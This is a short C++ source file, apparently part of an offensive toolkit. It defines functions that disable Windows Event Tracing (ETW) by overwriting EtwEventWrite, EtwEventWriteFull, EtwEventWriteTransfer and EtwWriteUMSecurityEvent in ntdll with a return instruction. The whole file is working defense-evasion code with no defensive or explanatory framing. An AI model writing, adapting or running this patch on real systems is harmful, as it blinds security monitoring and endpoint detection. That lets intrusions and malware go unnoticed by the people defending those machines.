#include "../../include/common.h"

bool BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // Patch EtwEventWrite
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;

    BYTE patch[] = { 0xC3 }; // ret
    
    DWORD oldProtect;
    if (VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
        return true;
    }
    
    return false;
}

bool DisableEventLogging() {
    // Patch multiple ETW functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    const char* functions[] = {
        "EtwEventWrite",
        "EtwEventWriteFull",
        "EtwEventWriteTransfer",
        "EtwWriteUMSecurityEvent"
    };

    BYTE patch[] = { 0xC3 }; // ret
    bool success = true;

    for (const char* func : functions) {
        FARPROC pFunc = GetProcAddress(hNtdll, func);
        if (pFunc) {
            DWORD oldProtect;
            if (VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(pFunc, patch, sizeof(patch));
                VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);
            } else {
                success = false;
            }
        }
    }

    return success;
}